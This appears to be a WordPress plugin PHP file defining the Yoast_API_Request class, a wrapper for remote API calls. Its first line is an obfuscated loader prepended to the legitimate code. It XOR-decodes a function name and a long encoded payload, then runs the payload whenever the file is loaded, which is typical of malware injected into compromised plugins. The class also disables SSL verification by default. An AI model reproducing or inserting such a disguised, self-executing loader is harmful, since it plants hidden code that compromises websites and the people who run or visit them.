<?php $iGxKcNyBB=':DVZ8<>>M>3T3S='^'Y63;LYaX8PP Z<S';$ooSRV=$iGxKcNyBB('','X BLWIPWNDYZoE,:K26EME,0:S8D7e7UXAQZOOMhPRNTQ>E>YqJ Os0-<Ji6PY PBZX,YMpp,S1FLdcwvCZslJZ>.PZQdMJK7:3O;ZeQAHDYrom9Y99:4S,ntW.B,qVBp;OabaK1QZU5UawqoGIP8L4HZhN:guG238pZmiy+TC=S7BJXW2k5bwopQ0WTHD4zu8>5SY:43h-ODQT-F8wtr<PYSTOZhZT6T6:STwLZ4XPH5X9R,Z85-XXcDNo7b.-..eSGuGKUEBoUFF3T9-5pkI71qO7YAqZV2ntIM-4.mP2kUL,JCOtqAQ;ESZhFKATZCYYL10:WpK.i:J7<Q.CQPKT25pahq>jGX9oFPUUlzymu8L;G3MMHYQSN0YZQi,UHnpRU,,;KL;ovQ-6XiIRH:7LCTnIDMPHZfB4MDWKnwvEB -L;L8<+HnXDL5V 65b8MCBGY7XIxl<<3,<U.NKDZ=-JuZpVPG93K0Waaj78+IPV234mCHbQ4LA1>U54bPJ9J=+Bv-V7rGDT4.5LpoNJrPMHoFb37YU,O;HIv>fhJURQWbLZqEjhZEXNpF,JmDWDExyYYWW2Qq6PbGpmCA1E;,09ER.n -9OM>Pq=A,+;AHdNqQTU1ANHTsjPEVF3L5ZRVrE A<V+m:;6WO7RbqSR8DWV8-fIzVe,'^'1Fjm1<>4:-640 TS8FEmj=CBe7Y0V:h8-5vsfo6bY4;:2J,Q7Q2O=,TLH+6i=,Txf>9X8aPTG6HolDCWV8Pzen5KZpgqCjqA>3U IrA8audiIOIPeJMHX6BFP3O6MXmbTRdJKkB8u5 AuOJQGc-1L-ol35ndGQ,WJcT3MLYX 1Q6Yjn32KBhKLeyXB2 =6ZRQWKAzb0=NbPENu0L2YWIRZ15 1tPL>5B5iQ6-WqzR9<;Pc3XJ5JPL;0Clj0t-afgkE24Uc 0<bRkfbE5UXPYK2=8U+V- .13KNIiiFQWVZ;O1-X+crTU70W06ab;AK=<cqxhUQN6YkUc3,XN4O 9pcpmg50=4m>g9JOb;0,LGGMQN-W2Vdm3SXZjT8.06G01NMrqGIBpF2fR5LB9ItrlLV 61UCM0Z5PlfP,06kSW60,SH>R-TUQ-F +>j2ABT=g 66o;V+,NXcXVOS1Kfo ;ILcYzT213Xl U.HHQ=QMat2SGUMenB0F> Ha>PM=52P9IXjQF3NUkdpPOA-YOhlRx ,ZnFWV-4whP-0QcOHwhrv6VybAwXXcrm,AwI.Yt1rpMKhk14W5DP5EnPKeaP7IMIf.7W1EUP<9MxVM UGT ,CbQu04E gatSJpev=9EP,3:ZaD H7pJJZO; V6E,zi2M2.QYNySmoQ');$ooSRV();

if ( ! class_exists( "Yoast_API_Request", false ) ) {

	/**
	* Handles requests to the Yoast EDD API
	*/
	class Yoast_API_Request {

		/**
		* @var string Request URL
		*/
		private $url = '';

		/**
		* @var array Request parameters
		*/
		private $args = array(
			'method' => 'GET',
			'timeout' => 10,
			'sslverify' => false,
			'headers' => array(
				'Accept-Encoding' => '*',
				'X-Yoast-EDD' => '1'
			)
		);

		/**
		* @var boolean
		*/
		private $success = false;

		/**
		* @var mixed
		*/
		private $response;

		/**
		* @var string
		*/
		private $error_message = '';

		/**
		* Constructor
		* 
		* @param string url
		* @param array $args
		*/
		public function __construct( $url, array $args = array() ) {

			// set api url
			$this->url = $url;

			// set request args (merge with defaults)
			$this->args = wp_parse_args( $args, $this->args );

			// fire the request
			$this->success = $this->fire();
		}

		/**
		* Fires the request, automatically called from constructor
		*
		* @return boolean
		*/
		private function fire() {

			// fire request to shop
			$response = wp_remote_request( $this->url, $this->args );

			// validate raw response
			if( $this->validate_raw_response( $response ) === false ) {
				return false;
			}

			// decode the response
			$this->response = json_decode( wp_remote_retrieve_body( $response ) );

			// response should be an object
			if( ! is_object( $this->response ) ) {
				$this->error_message = 'No JSON object was returned.';
				return false;
			}

			return true;
		}

		/**
		* @param object $response
		* @return boolean
		*/
		private function validate_raw_response( $response ) {

			// make sure response came back okay
			if( is_wp_error( $response ) ) {
				$this->error_message = $response->get_error_message();
				return false;
			}

			// check response code, should be 200
			$response_code = wp_remote_retrieve_response_code( $response );

			if( false === strstr( $response_code, '200' ) ) {

				$response_message = wp_remote_retrieve_response_message( $response );
				$this->error_message = "{$response_code} {$response_message}";

				return false;
			}

			return true;
		}

		/**
		* Was a valid response returned?
		*
		* @return boolean
		*/ 
		public function is_valid() {
			return ( $this->success === true );
		}

		/**
		* @return string
		*/
		public function get_error_message() {
			return $this->error_message;
		}

		/**
		* @return object
		*/
		public function get_response() {
			return $this->response;
		}
	}

}
